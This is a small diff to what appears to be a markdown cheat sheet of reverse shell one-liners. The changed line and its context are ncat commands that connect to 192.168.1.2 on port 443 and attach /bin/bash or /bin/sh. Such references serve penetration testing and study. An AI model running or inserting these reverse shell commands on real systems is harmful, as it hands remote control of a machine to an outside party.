@@ -418,7 +418,7 @@
   ```cmd
   ncat 192.168.1.2 443 -e /bin/bash
   
-  ncat 192.168.1.2 443 -e sh
+  ncat 192.168.1.2 443 -e /bin/sh
   ```
   
   # <kbd>UDP</kbd>
